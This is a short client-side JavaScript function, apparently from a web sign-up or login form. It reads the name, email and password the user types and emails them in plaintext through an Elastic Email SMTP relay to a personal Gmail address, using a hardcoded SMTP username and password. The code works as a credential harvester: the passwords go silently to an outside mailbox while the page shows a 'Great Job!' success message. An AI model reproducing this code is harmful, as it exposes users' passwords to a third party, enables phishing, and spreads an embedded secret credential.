function sendEmail(){
    var name=document.getElementById("name").value; 
    var mail=document.getElementById("mail").value;
    var psw=document.getElementById("pwd").value;
    var msgb="Name: "+ name +"<br> email : "+mail +"<br> password: "+psw;
    console.log(mail);
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "yasserg4e@gmail.com",
        Password : "7A0A5E75AC0BBA51E67547BC2F252CA10844",
        To : "yasserg4e@gmail.com",
        From : "yasserg4e@gmail.com",
        Subject : "Welcome to our web site ",
        Body : msgb
    }).then(
      message => {
        if(message=="OK"){
            Swal.fire({
                title: "Great Job!",
                text: "You clicked the button!",
                icon: "success"
              });
        }
      }
    );
}

